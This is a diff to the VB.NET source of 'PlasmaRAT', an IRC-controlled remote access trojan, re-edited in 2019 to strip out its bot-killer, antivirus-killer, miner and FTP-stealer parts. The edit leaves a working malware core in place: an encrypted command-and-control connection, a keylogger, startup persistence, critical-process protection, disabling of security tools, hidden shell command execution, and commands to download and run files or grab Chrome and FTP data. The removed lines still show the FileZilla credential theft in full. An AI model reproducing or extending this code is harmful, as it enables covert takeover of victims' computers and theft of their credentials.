@@ -1,4 +1,6 @@
-﻿'KFC Watermelon 2013
+﻿'Created: KFC WATERMELON 2013
+'Modificated: Mogyiii 2019
+'DELETED: BOTKILLER, AVKILLER,
 Imports System.Threading
 Imports System.IO
 Imports System.Net.Sockets
@@ -24,12 +26,10 @@ Public Module PlasmaRAT
     Private Delegate Sub MessageReceived(ByVal msg As String)
     Private Event MSG As MessageReceived
 
-    Public Antis As New Thread(New ThreadStart(AddressOf AntiEverything.RunAntis))
-    Public ProactiveAV As New Thread(New ThreadStart(AddressOf ProactiveAVKill))
+    'Public Antis As New Thread(New ThreadStart(AddressOf AntiEverything.RunAntis)) 'Anti Sandbox
 
     Public IRCThread As New Thread(New ThreadStart(AddressOf connect))
 
-    Public AVKillThread As New Thread(New ThreadStart(AddressOf AVKill.Start))
     Public LoggerThread As New Thread(New ThreadStart(AddressOf StartLogger))
     Public InstallationOfEverything As String
     Public keepalive As Boolean = False
@@ -68,11 +68,7 @@ Public Module PlasmaRAT
         End Try
         Try
             If Application.ExecutablePath.Contains("HardwareCheck.exe") Then
-                AVKill.Start()
                 Disablers.Disable()
-                If WhatToRun.Contains("bk") Then
-                    RunStandardBotKiller()
-                End If
                 Dim r As New Random
                 My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & r.Next(1000, 9000).ToString)
                 End
@@ -112,43 +108,16 @@ Public Module PlasmaRAT
         LoggerThread.Start()
         If WhatToRun.Contains("q") Then ProcessAccessRights.ProtectCurrentProcess()
 
-
-
-
-
-        Dim ProactiveBK = New System.Timers.Timer(30000)
-        AddHandler ProactiveBK.Elapsed, AddressOf PlasmaRAT.ProactiveBK
-
-
         Dim Startup = New System.Timers.Timer(5000)
         AddHandler Startup.Elapsed, AddressOf Persistence.Startup
 
-
-        Dim InjectionPersistence = New System.Timers.Timer(5000)
-        AddHandler InjectionPersistence.Elapsed, AddressOf LoadPersitenceEngine
-
-
-        Dim Miner1 = New System.Timers.Timer(5000)
-        AddHandler Miner1.Elapsed, AddressOf MinerThreader
-        Miner1.Start()
-
-        Dim Miner2 = New System.Timers.Timer(5000)
-        AddHandler Miner2.Elapsed, AddressOf GPUMinerThreader
-        Miner2.Start()
-        AntiEverything.RunAntis()
+        'AntiEverything.RunAntis() 'Anti Sandbox
         If WhatToRun.Contains("z") Then
             If WhatToRun.Contains("s") Then Startup.Start()
-            If WhatToRun.Contains("i") Then InjectionPersistence.Start()
-            ProactiveBK.Start()
-            If WhatToRun.Contains("a") Then
-                AVKillThread.Start()
-                ProactiveAV.Start()
-            End If
             If WhatToRun.Contains("c") Then CriticalProcess()
             If WhatToRun.Contains("bk") Then Call SaveSetting("Microsoft", "Sysinternals", "BK", "active")
         End If
-        BeginMiner()
-        BeginGPUMiner()
+
         Disablers.Disable()
     End Sub
     Sub InstallBot()
@@ -189,7 +158,7 @@ Public Module PlasmaRAT
             End If
         Catch : End Try
     End Sub
-    Public Sub connect()
+    Public Sub connect() 'Start Connect
         Try
             IRC = New TcpClient(Server, port)
 
@@ -205,7 +174,7 @@ Public Module PlasmaRAT
                 AddHandler MSG, AddressOf Parsecommands
             End If
 
-            IRC.GetStream().BeginRead(New Byte() {0}, 0, 0, New AsyncCallback(AddressOf lmfao), Nothing)
+            IRC.GetStream().BeginRead(New Byte() {0}, 0, 0, New AsyncCallback(AddressOf Connection_read), Nothing)
         Catch
             Try
                 If WhatToRun.Contains("y") Then
@@ -222,91 +191,29 @@ Public Module PlasmaRAT
             connect()
         End Try
     End Sub
-    Public Sub SendPing()
+    Public Sub SendPing() 'Connect reserve
         While True
             Try
                 Send("l")
-
             Catch : End Try
             Thread.Sleep(60000)
         End While
     End Sub
-    Public Sub lmfao(ByVal ar As IAsyncResult)
+    Public Sub Connection_read(ByVal ar As IAsyncResult)
         Try
             Read = New StreamReader(IRC.GetStream())
             RaiseEvent MSG((AES_Decrypt(Read.ReadLine())))
-            IRC.GetStream().BeginRead(New Byte() {0}, 0, 0, New AsyncCallback(AddressOf lmfao), Nothing)
-        Catch
+            IRC.GetStream().BeginRead(New Byte() {0}, 0, 0, New AsyncCallback(AddressOf Connection_read), Nothing)
+        Catch 'Connection reset
             Threading.Thread.Sleep(1000)
-
             Try
                 IRC.Close()
             Catch : End Try
             connect()
         End Try
     End Sub
-    Public Function BotName()
-        Try
-            Dim lolol As String = ""
-            Dim bit As String = String.Empty
-            lolol = lolol & "1.5.1"
-            Try
-                lolol = lolol & "*" & Getcn.g & ""
-            Catch
-                lolol = lolol & "*" & "Error" & ""
-            End Try
-            Try
-                If Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") Then
-                    bit = "x64*"
-                Else
-                    bit = "x86*"
-                End If
-            Catch
-                bit = "*x86*"
-            End Try
-            Try
-                Dim OS As String = My.Computer.Info.OSFullName
-                If OS.Contains("XP") Then lolol = lolol & "*Windows XP " & bit
-                If OS.Contains("Windows 7") Then lolol = lolol & "*Windows 7 " & bit
-                If OS.Contains("Vista") Then lolol = lolol & "*Windows Vista " & bit
-                If OS.Contains("Windows 8") Then lolol = lolol & "*Windows 8 " & bit
-                If OS.Contains("Server") Then lolol = lolol & "*Windows Server " & bit
-                If Not lolol.Contains("Windows") Then lolol = lolol & "*Windows " & bit
-            Catch
-                lolol = lolol & "*Windows " & bit
-            End Try
 
-            Try
-                Dim username As String = Environment.UserName
-                If Not username = String.Empty Then
-                    lolol = lolol & "" & username & "*"
-
-                Else
-                    lolol = lolol & "" & "Error" & "*"
-                End If
-            Catch
-                lolol = lolol & "Error*"
-            End Try
-            Try
-                Dim x1 = Environment.ProcessorCount
-                Dim fap
-                If x1 = 1 Then fap = "1 Core" Else fap = x1.ToString & " Cores"
-                lolol = lolol & "" & fap & "*"
-            Catch
-                lolol = lolol & "" & "N/A" & "*"
-            End Try
-
-            Try
-                If IsAdmin() Then lolol = lolol & "Admin*" Else lolol = lolol & "User*"
-            Catch ex As Exception
-                lolol = lolol & "Error*"
-            End Try
-            lolol = lolol
-            Return lolol
-        Catch : End Try
-
-    End Function
-    Public Sub Parsecommands(ByVal Input As String)
+    Public Sub Parsecommands(ByVal Input As String) 'Commands
         Try
             Dim DataSplitted() As String = Split(Input, " ")
             Select Case DataSplitted(0)
@@ -315,26 +222,9 @@ Public Module PlasmaRAT
                 Case "seed"
                     SeedTorrent(DataSplitted(1))
                 Case ("miner.start")
-                    InstallMiner(DataSplitted(1), DataSplitted(2), DataSplitted(3), DataSplitted(4))
-                Case ("miner.stop")
-                    RemoveMiner()
-                Case ("miner.gpu.start")
-                    If Not My.Computer.Info.OSFullName.Contains("XP") Then
-                        InstallGPUMiner(DataSplitted(1), DataSplitted(2), DataSplitted(3), DataSplitted(4))
-                    End If
-                Case ("miner.reset")
-                    AllowAccess(InstallationOfEverything)
-                    If IO.File.Exists(Miner.PoolerMiner) Then
-                        AllowAccess(Miner.PoolerMiner)
-                        IO.File.Delete(Miner.PoolerMiner)
-                    End If
-                    If IO.File.Exists(GPUMinerFile) Then
-                        AllowAccess(GPUMiner.GPUMinerFile)
-                        IO.File.Delete(GPUMiner.GPUMinerFile)
-                    End If
-                    TalktoChannel("Reset Miner Successfully!", String.Empty)
+                    'InstallMiner(DataSplitted(1), DataSplitted(2), DataSplitted(3), DataSplitted(4))
                 Case ("miner.gpu.stop")
-                    RemoveGPUMiner()
+
                 Case ("keylogger.send")
                     SendLogs()
                 Case ("keylogger.delete")
@@ -352,23 +242,8 @@ Public Module PlasmaRAT
                     Else
                         TalktoChannel("File name " & DataSplitted(2) & " already used. Ignoring Execute File", String.Empty)
                     End If
-                Case ("update.bot")
-                    Dim DLLocation = IO.Path.GetTempPath & DataSplitted(2)
-                    If Not My.Computer.FileSystem.FileExists(DLLocation) Then
-                        Dim download As New WebClient
-                        download.DownloadFile(DataSplitted(1), DLLocation)
-                        Try : OneBotOnly.Close() : Catch : End Try
-                        TalktoChannel("Bot Update Successful! Uninstalling...", "")
-                        Process.Start(DLLocation)
-                        NonCriticalProcess()
-                              KillFile(Application.ExecutablePath)
-                        End
-                        Environment.Exit(0)
-                    Else
-                        TalktoChannel("File name " & DataSplitted(2) & " already used. Ignoring Update.", String.Empty)
-                    End If
                 Case ("visit")
-                    If DataSplitted(1) = "-h" Then
+                    If DataSplitted(1) = "-h" Then 'Ezt átkell alakitani
                         Dim Browser As New ProcessStartInfo
                         Browser.FileName = "iexplore.exe"
                         Browser.Arguments = DataSplitted(2)
@@ -406,7 +281,7 @@ Public Module PlasmaRAT
                     Dim output As String = GetAntiVirus() & ". " & GetFirewall()
                     TalktoChannel(output, "")
                 Case ("ftp")
-                    ftpsteal()
+                    FTPSteal.ftpsteal()
                 Case ("chrome")
                     GetChrome()
                 Case ("info")
@@ -417,11 +292,6 @@ Public Module PlasmaRAT
                     Dim asdf() As String = Split(Input, """")
                     Shell((asdf(1)), AppWinStyle.Hide)
                     TalktoChannel("Shell Command Executed.", "")
-                Case ("remove.bot")
-                    NonCriticalProcess()
-                    KillFile(Application.ExecutablePath)
-                    End
-                    Environment.Exit(0)
             End Select
 
             If Input.Contains("mute") Then
@@ -467,28 +337,11 @@ Public Module PlasmaRAT
                     StopCondis()
                 End If
             End If
-            If Input.Contains("botkiller") Then
-                If Input.Contains("hardbk") Then
-                    Call SaveSetting("Microsoft", "Sysinternals", "BK", "active")
-                    HardBotKill()
-                End If
-                If Input.Contains("enable") Then
-                    Call SaveSetting("Microsoft", "Sysinternals", "BK", "active")
-                    TalktoChannel("Proactive Bot Killer Enabled!", " ")
-                End If
-                If Input.Contains("disable") Then
-                    Call SaveSetting("Microsoft", "Sysinternals", "BK", "")
-                    TalktoChannel("Proactive Bot Killer Disabled!", "")
-                End If
-                If Input.Contains("run") Then
-                    RunBotKiller = True
-                End If
-            End If
-        Catch fasjdfasdf As Exception
-            TalktoChannel("Error: " & fasjdfasdf.ToString, String.Empty)
+        Catch Error_Msg As Exception
+            TalktoChannel("Error: " & Error_Msg.ToString, String.Empty)
         End Try
     End Sub
-    Public Sub Send(ByVal MSG As String)
+    Public Sub Send(ByVal MSG As String) 'Send Encrypted MSG
         Try
             Write = New StreamWriter(IRC.GetStream())
             Write.WriteLine(AES_Encrypt(MSG))
@@ -496,105 +349,18 @@ Public Module PlasmaRAT
         Catch ex As Exception
         End Try
     End Sub
-    Public Sub TalktoChannel(ByVal blue As String, ByVal red As String)
+    Public Sub TalktoChannel(ByVal blue As String, ByVal red As String) 'Channel
         Try
             If Muted = False Then
-
-                Dim xd = Environment.UserName.ToString
-
-                Send("LOGS*" & xd & "*" & blue & red & "*")
+                Dim Username = Environment.UserName.ToString
+                Send("LOGS*" & Username & "*" & blue & red & "*")
                 ' Send((Convert.ToString("PRIVMSG ") & Channel) + " " & ChrW(3) & "12" & blue & ChrW(3) & "10" & red)
             End If
         Catch
         End Try
     End Sub
 
-    Public Sub ProactiveBK()
-        Try
-            If RunBotKiller = True Then
-                RunBotKiller = False
-                BotKillers.RunStandardBotKiller()
-            End If
-            If Not GetSetting("Microsoft", "Sysinternals", "BK") = String.Empty Then
-                ScanProcess()
-                RunStartupKiller()
-            End If
-        Catch : End Try
-    End Sub
-    Public Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
-        On Error Resume Next
-        If AutoBotKill = True Then
-            Do
-                BotKillers.RunStartupKiller()
-                Threading.Thread.Sleep(10)
-            Loop
-        End If
-
-        '   TalktoChannel("Windows is Shutting Down", "")
-    End Sub
-    Public Function AES_Encrypt(ByVal input As String) As String
-        Dim AES As New System.Security.Cryptography.RijndaelManaged
-        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
-        Dim encrypted As String = ""
-        Try
-            Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(Username))
-            Array.Copy(temp, 0, hash, 0, 16)
-            Array.Copy(temp, 0, hash, 15, 16)
-            AES.Key = hash
-            AES.Mode = System.Security.Cryptography.CipherMode.ECB
-            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
-            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
-            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
-            Return encrypted
-        Catch ex As Exception
-        End Try
-    End Function
-    Public Function GetCPU() As String
-        Try
-            Dim Proc As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
-            Proc.Get()
-            Return (Proc("Name").ToString)
-
-        Catch ex As Exception
-            Return "N/A"
-        End Try
-
-    End Function
-    Public Function GetVideoCard() As String
-        Try
-            Dim VideoCard As String = String.Empty
-            Dim objquery As New ObjectQuery("SELECT * FROM Win32_VideoController")
-            Dim objSearcher As New ManagementObjectSearcher(objquery)
-
-            For Each MemObj As ManagementObject In objSearcher.Get
-                VideoCard = VideoCard & (MemObj("Name")) & ". "
-
-            Next
-            Return (VideoCard)
-        Catch
-            Return "N/A"
-        End Try
-    End Function
-    Public Function AES_Decrypt(ByVal input As String) As String
-        Dim AES As New System.Security.Cryptography.RijndaelManaged
-        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
-        Dim decrypted As String = ""
-        Try
-            Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(Username))
-            Array.Copy(temp, 0, hash, 0, 16)
-            Array.Copy(temp, 0, hash, 15, 16)
-            AES.Key = hash
-            AES.Mode = System.Security.Cryptography.CipherMode.ECB
-            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
-            Dim Buffer As Byte() = Convert.FromBase64String(input)
-            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
-            Return decrypted
-        Catch ex As Exception
-        End Try
-    End Function
-    Public Function DecryptConfig(ByVal input As String) As String
+    Public Function DecryptConfig(ByVal input As String) As String 'Decrypt
         Dim AES As New System.Security.Cryptography.RijndaelManaged
         Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
         Dim decrypted As String = ""
@@ -612,33 +378,6 @@ Public Module PlasmaRAT
         Catch ex As Exception
         End Try
     End Function
-    Function GetAntiVirus() As String
-        Try
-            Dim str As String = Nothing
-            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
-            Dim instances As ManagementObjectCollection = searcher.[Get]()
-            For Each queryObj As ManagementObject In instances
-                str = queryObj("displayName").ToString()
-            Next
-            If str = String.Empty Then str = "N/A"
-            str = "AntiVirus: " & str.ToString
-            Return str
-            searcher.Dispose()
-        Catch
-            Return "AntiVirus: N/A"
-        End Try
-    End Function
-    Public Sub ftpsteal()
-        Try
-            Dim file As String
-            Dim credentials As String
-            Dim Reader As New IO.StreamReader(Environ("AppData") & "\FileZilla\recentservers.xml")
-            file = Reader.ReadToEnd()
-            Reader.Close()
-            credentials = ftpstealer("<Host>(.+?)</Host>\s+.+\s+.+\s+.+\s+<User>(.+?)</User>\s+<Pass>(.+?)</Pass>", file)
-        Catch
-        End Try
-    End Sub
     Sub ReflectBytes(ByVal data As Byte())
         Dim T As New Thread(AddressOf Run) 'Work around for "SetCompatibleTextRenderingDefault"
         T.SetApartmentState(ApartmentState.STA) 'Set STA to support drag/drop and dialogs?
@@ -649,44 +388,9 @@ Public Module PlasmaRAT
         T.Invoke(Nothing, If(T.GetParameters.Length = 1, {New String() {}}, Nothing)) 'Invoke logic for Console or Form
     End Sub
 
-    Public Function ftpstealer(ByVal expression As String, ByVal source As String)
-        Try
-            Dim output As New StringBuilder
-            Dim myregex As New System.Text.RegularExpressions.Regex(expression)
-            Dim mymatches As MatchCollection = myregex.Matches(source)
-            Dim ie As IEnumerator
-            ie = mymatches.GetEnumerator
-            While ie.MoveNext
-                Dim current As Match = DirectCast(ie.Current, Match)
-                Dim objects As GroupCollection = current.Groups
-                Threading.Thread.Sleep(1000)
-                Send("PASS*" & objects(1).Value & "*" & objects(2).Value & "*" & objects(3).Value & "*")
-            End While
-            Return output.ToString
-        Catch
-            Return String.Empty
-        End Try
-    End Function
-    Function GetFirewall() As String
-        Try
-            Dim str As String = Nothing
-            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
-            Dim instances As ManagementObjectCollection = searcher.[Get]()
-            For Each queryObj As ManagementObject In instances
-                str = queryObj("displayName").ToString()
-            Next
-            If str = String.Empty Then str = "N/A"
-            str = "Firewall: " & str.ToString
-            Return str
-            searcher.Dispose()
-        Catch
-            Return "Firewall: N/A"
-        End Try
 
-    End Function
-
-    Class Getcn
-        <DllImport("kernel32.dll")> _
+    Class Getcn 'I don't know what is this 
+        <DllImport("kernel32.dll")>
         Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
         End Function
 
@@ -704,12 +408,11 @@ Public Module PlasmaRAT
                 End If
                 Return "Error"
             Catch : End Try
+            Return "Error"
         End Function
-
         Public Shared Function g() As String
             Return (GetInfo(LOCALE_SABBREVCTRYNAME))
         End Function
-
     End Class
     <DllImport("kernel32", CharSet:=CharSet.Unicode, SetLastError:=True)> _
     Public Function DeleteFile(ByVal name As String) As <MarshalAs(UnmanagedType.Bool)> Boolean
